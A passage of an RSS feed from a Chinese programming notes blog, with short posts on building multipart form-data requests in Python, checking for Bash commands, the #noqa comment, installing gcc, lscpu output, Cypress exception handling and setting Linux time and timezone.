&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;WebKit_format&lt;/span&gt;(data, boundary&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;----WebKitFormBoundary*********ABC&amp;#34;&lt;/span&gt;, headers&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;):
    &lt;span style=&#34;color:#75715e&#34;&gt;# 从headers中提取boundary信息&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; headers &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;:
        headers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;content-type&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; headers:
        fd_val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; str(headers[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;content-type&amp;#34;&lt;/span&gt;])
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;boundary&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; fd_val:
            fd_val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fd_val&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;;&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()
            boundary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fd_val&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exception&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multipart/form-data头信息错误，请检查content-type key是否包含boundary&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#75715e&#34;&gt;# form-data格式定式&lt;/span&gt;
    jion_str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;--&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Content-Disposition: form-data; name=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
    end_str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;--&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;--&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(boundary)
    args_str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; isinstance(data, dict):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;raise&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exception&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multipart/form-data参数错误，data参数应为dict类型&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; key, value &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;items():
        args_str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; args_str &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; jion_str&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(boundary, key, value)
    args_str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; args_str &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; end_str&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(boundary)
    args_str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; args_str&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; args_str
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b调用&#34;&gt;b.调用&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test001_auth_login&lt;/span&gt;():
    headers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Accept&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;application/json&amp;#34;&lt;/span&gt;,
               &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multipart/form-data; boundary=----WebKitFormBoundary*********ABC&amp;#34;&lt;/span&gt;,
               &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Accept-Encoding&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;gzip, deflate, br&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Connection&amp;#39;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;keep-alive&amp;#34;&lt;/span&gt;}
    url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://www.baidu.com/login/&amp;#34;&lt;/span&gt;
    bodyData &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;username&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1234567890&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a123456&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;account&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bindType&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;null&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;openId&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;null&amp;#34;&lt;/span&gt;
    }
    boundary_body &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; WebKit_format(data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bodyData, headers&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;headers)
    print(boundary_body)
    response &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;post(url, data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;boundary_body, headers&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;headers)
    access_token &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; regSearchString(response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#34;access_token&amp;#34;:&amp;#34;(.+?)&amp;#34;,&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;正则--获取登陆的access_token:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; access_token)
    print(response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;text)
    time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;c输出&#34;&gt;c.输出&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;boundary_body &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; WebKit_format(data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bodyData, headers&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;headers)

&lt;span style=&#34;color:#f92672&#34;&gt;------&lt;/span&gt;WebKitFormBoundary7MA4YWxkTrZu0gW
Content&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Disposition: form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;data; name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;v&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#ae81ff&#34;&gt;2.0&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;------&lt;/span&gt;WebKitFormBoundary7MA4YWxkTrZu0gW
Content&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Disposition: form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;data; name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;req&amp;#34;&lt;/span&gt;

{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cno&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1213058673616305&amp;#34;&lt;/span&gt;}
&lt;span style=&#34;color:#f92672&#34;&gt;------&lt;/span&gt;WebKitFormBoundary7MA4YWxkTrZu0gW
Content&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Disposition: form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;data; name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sig&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;------&lt;/span&gt;WebKitFormBoundary7MA4YWxkTrZu0gW
Content&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Disposition: form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;data; name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ts&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;------&lt;/span&gt;WebKitFormBoundary7MA4YWxkTrZu0gW
Content&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Disposition: form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;data; name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;appid&amp;#34;&lt;/span&gt;

dp3wY4YtycajNEz23zZpb5Jl
&lt;span style=&#34;color:#f92672&#34;&gt;------&lt;/span&gt;WebKitFormBoundary7MA4YWxkTrZu0gW&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Linux—检查命令是否存在</title>
        <link>https://ac-lm.github.io/posts/linux/linux%E6%A3%80%E6%9F%A5%E5%91%BD%E4%BB%A4%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8/</link>
        <pubDate>Thu, 18 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linux%E6%A3%80%E6%9F%A5%E5%91%BD%E4%BB%A4%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://stackoverflow.com/questions/592620/how-can-i-check-if-a-program-exists-from-a-bash-script&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; check if a program exists from a Bash script? @Stack Overflow &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1answer&#34;&gt;1.Answer&lt;/h2&gt;
&lt;p&gt;你可以使用&lt;code&gt;command -v&lt;/code&gt;来检查特定命令是否存在，在 Bash 脚本中使用以下代码检查&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if ! command -v &amp;lt;the_command&amp;gt; &amp;amp;&amp;gt; /dev/null
then
    echo &amp;quot;&amp;lt;the_command&amp;gt; could not be found&amp;quot;
    exit
fi
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在一些特别的环境中，还可以使用&lt;code&gt;hash&lt;/code&gt;，&lt;code&gt;type&lt;/code&gt;来进行检查&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;hash &amp;lt;the_command&amp;gt; # For regular commands. Or...
type &amp;lt;the_command&amp;gt; # To check built-ins and keywords
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2explanation&#34;&gt;2.Explanation&lt;/h2&gt;
&lt;p&gt;请避免使用&lt;code&gt;which&lt;/code&gt;。在许多操作系统中&lt;code&gt;which&lt;/code&gt;不会设置退出状态，其不会返回&lt;strong&gt;否&lt;/strong&gt;。意味着如果&lt;code&gt;if which foo&lt;/code&gt;不会返回&lt;code&gt;foo&lt;/code&gt;不存在，总会报告&lt;code&gt;foo&lt;/code&gt;存在。此外，&lt;code&gt;which&lt;/code&gt;还会将输出更改或将结果挂载在包管理器中。&lt;/p&gt;
&lt;p&gt;因此请尽量避免使用&lt;code&gt;which&lt;/code&gt;，请改用以下方法。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ command -v foo &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 || { echo &amp;gt;&amp;amp;2 &amp;quot;I require foo but it&#39;s not installed.  Aborting.&amp;quot;; exit 1; }
$ type foo &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 || { echo &amp;gt;&amp;amp;2 &amp;quot;I require foo but it&#39;s not installed.  Aborting.&amp;quot;; exit 1; }
$ hash foo 2&amp;gt;/dev/null || { echo &amp;gt;&amp;amp;2 &amp;quot;I require foo but it&#39;s not installed.  Aborting.&amp;quot;; exit 1; }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;请将结果输出到空&lt;code&gt;2&amp;gt;/dev/null&lt;/code&gt;，以避免程序出错。&lt;/p&gt;
&lt;p&gt;一个简单的函数示例如下，如果命令存在则运行，否则返回 &lt;code&gt;gdate date&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gnudate() {
    if hash gdate 2&amp;gt;/dev/null; then
        gdate &amp;quot;$@&amp;quot;
    else
        date &amp;quot;$@&amp;quot;
    fi
}
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>Python—忽略检查noqa</title>
        <link>https://ac-lm.github.io/posts/python/python%E5%BF%BD%E7%95%A5%E6%A3%80%E6%9F%A5noqa/</link>
        <pubDate>Thu, 18 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E5%BF%BD%E7%95%A5%E6%A3%80%E6%9F%A5noqa/</guid>
        <description>&lt;h2 id=&#34;noqas&#34;&gt;#noqas&lt;/h2&gt;
&lt;p&gt;将 &lt;code&gt;#noqa&lt;/code&gt; 添加到一行表示 IDE 的 linter 代码质量检查程序不应该检查此行，该代码可能生成的任何警告都将被忽略。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Nothing  &lt;span style=&#34;color:#75715e&#34;&gt;#noqa&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>BUG—Linux 报错 no C compiler found in $PATH</title>
        <link>https://ac-lm.github.io/posts/bug/buglinux-%E6%8A%A5%E9%94%99-no-c-compiler-found-in-path/</link>
        <pubDate>Wed, 17 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/buglinux-%E6%8A%A5%E9%94%99-no-c-compiler-found-in-path/</guid>
        <description>&lt;h2 id=&#34;bug-描述&#34;&gt;BUG 描述&lt;/h2&gt;
&lt;p&gt;在 Linux 编译某些程序时，出现报错&lt;/p&gt;
&lt;p&gt;&lt;code&gt;configure: error: no acceptable C compiler found in $PATH&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;Linux 缺少合适的编译器&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;yum install gcc-c++
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;gcc 为 GNU Compiler Collection 的缩写，可以编译 C 和 C++ 源代码等，它是 GNU 开发的 C 和 C++ 以及其他很多种语言的编译器（最早的时候只能编译 C，后来很快进化成一个编译多种语言的集合，如 Fortran、Pascal、Objective-C、Java、Ada、 Go 等。）&lt;/p&gt;
&lt;p&gt;gcc 在编译 C++ 源代码的阶段，只能编译 C++ 源文件，而不能自动和 C++ 程序使用的库链接（编译过程分为编译、链接两个阶段，源程序文件被编译成目标文件，多个目标文件连同库被链接成一个最终的可执行文件，可执行文件被加载到内存中运行）。因此，通常使用 g++ 命令来完成 C++ 程序的编译和连接，该程序会自动调用 gcc 实现编译。&lt;/p&gt;
&lt;p&gt;g++ 也能编译 C 源代码，只不过把会把它当成 C++ 源代码。后缀为 .c 的源文件，gcc 把它当作是 C 程序，而 g++ 把它当作是 c++ 程序，后缀为 .cpp 的，两者都会认为是 c++ 程序。注意，虽然 c++ 是 c 的超集，但是两者对语法的要求是有区别的。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Linux—lscpu</title>
        <link>https://ac-lm.github.io/posts/linux/linuxlscpu/</link>
        <pubDate>Mon, 15 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linuxlscpu/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://whosemario.github.io/2016/05/20/lscpu-cmd&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; lscpu 中 socket、core、thread 的意义 @Whosemario的家&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1lscpu&#34;&gt;1.lscpu&lt;/h2&gt;
&lt;p&gt;Linux 上使用 lscpu 可以查看CPU的信息&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; lscpu
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行命令后会输出以下结果&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Architecture:          x86_64
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                32
On-line CPU(s) list:   0-31
Thread(s) per core:    2
Core(s) per socket:    8
Socket(s):             2
NUMA node(s):          2
Vendor ID:             GenuineIntel
CPU family:            6
Model:                 62
Model name:            Intel(R) Xeon(R) CPU E5-2640 v2 @ 2.00GHz
Stepping:              4
CPU MHz:               1320.468
CPU max MHz:           2500.0000
CPU min MHz:           1200.0000
BogoMIPS:              4000.99
Virtualization:        VT-x
L1d cache:             32K
L1i cache:             32K
L2 cache:              256K
L3 cache:              20480K
NUMA node0 CPU(s):     0-7,16-23
NUMA node1 CPU(s):     8-15,24-31
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;2socket&#34;&gt;2.Socket&lt;/h5&gt;
&lt;p&gt;Socket 就是主板上插 CPU 的槽的数量&lt;/p&gt;
&lt;h5 id=&#34;3core&#34;&gt;3.Core&lt;/h5&gt;
&lt;p&gt;Core 就是平时说的核，双核、四核等，就是每个 CPU 上的核数&lt;/p&gt;
&lt;h5 id=&#34;4thread&#34;&gt;4.Thread&lt;/h5&gt;
&lt;p&gt;Thread 就是每个 Core 上的硬件线程数，即超线程&lt;/p&gt;
&lt;p&gt;对操作系统来说，其逻辑 CPU 的数量就是 Socket&lt;em&gt;Core&lt;/em&gt;Thread&lt;/p&gt;
</description>
        </item>
        <item>
        <title>BUG—Cypress 出现应用代码的错误</title>
        <link>https://ac-lm.github.io/posts/bug/bugcypress-%E5%87%BA%E7%8E%B0%E5%BA%94%E7%94%A8%E4%BB%A3%E7%A0%81%E7%9A%84%E9%94%99%E8%AF%AF/</link>
        <pubDate>Sat, 18 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/bugcypress-%E5%87%BA%E7%8E%B0%E5%BA%94%E7%94%A8%E4%BB%A3%E7%A0%81%E7%9A%84%E9%94%99%E8%AF%AF/</guid>
        <description>&lt;h2 id=&#34;bug描述&#34;&gt;BUG描述&lt;/h2&gt;
&lt;p&gt;在我们使用 Cypress 进行自动化时，有时网页自身的 JavaScript 会出现报错，此时 Cypress 也会捕抓这个异常，但这个异常并不是 Cypress 引起的，而我们也不需要这个异常。&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;我们可以在脚本开头添加以下代码，屏蔽这类异常&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Cypress&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;uncaught:exception&amp;#39;&lt;/span&gt;, (&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;runnable&lt;/span&gt;) =&amp;gt; {
    &lt;span style=&#34;color:#75715e&#34;&gt;// returning false here prevents Cypress from
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// failing the test
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Jerry errors!&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
})
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;参考原文：https://www.cnblogs.com/sap-jerry/p/14713564.html&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Linux—修改 Linux 时区或时间</title>
        <link>https://ac-lm.github.io/posts/linux/linux%E4%BF%AE%E6%94%B9-linux-%E6%97%B6%E5%8C%BA%E6%88%96%E6%97%B6%E9%97%B4/</link>
        <pubDate>Sat, 18 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linux%E4%BF%AE%E6%94%B9-linux-%E6%97%B6%E5%8C%BA%E6%88%96%E6%97%B6%E9%97%B4/</guid>
        <description>&lt;h2 id=&#34;1查看和修改linux的时区&#34;&gt;1.查看和修改Linux的时区&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;date -R&lt;/code&gt;：查看当前时区&lt;/li&gt;
&lt;li&gt;&lt;code&gt;tzselect&lt;/code&gt;：适用于 RedHat Linux 和 CentOS 的时区设置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;timeconfig&lt;/code&gt;：适用于 Debian 的时区设置&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime&lt;/code&gt;：复制时区文件，以替换系统时区文件，来设置时间&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2查看和修改linux的时间&#34;&gt;2.查看和修改Linux的时间&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;date&lt;/code&gt;：查看时间和日期&lt;/li&gt;
&lt;li&gt;&lt;code&gt;date -s 11/03/2009&lt;/code&gt;：将系统日期设定成2009年11月3日&lt;/li&gt;
&lt;li&gt;&lt;code&gt;date -s 17:55:55&lt;/code&gt;：将系统时间设定成下午5点55分55秒&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hwclock -w&lt;/code&gt;：将当前时间和日期写入BIOS，避免重启后失效&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Python—文件写入读取</title>
        <link>https://ac-lm.github.io/posts/python/python%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E8%AF%BB%E5%8F%96/</link>
        <pubDate>Sat, 18 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E8%AF%BB%E5%8F%96/</guid>
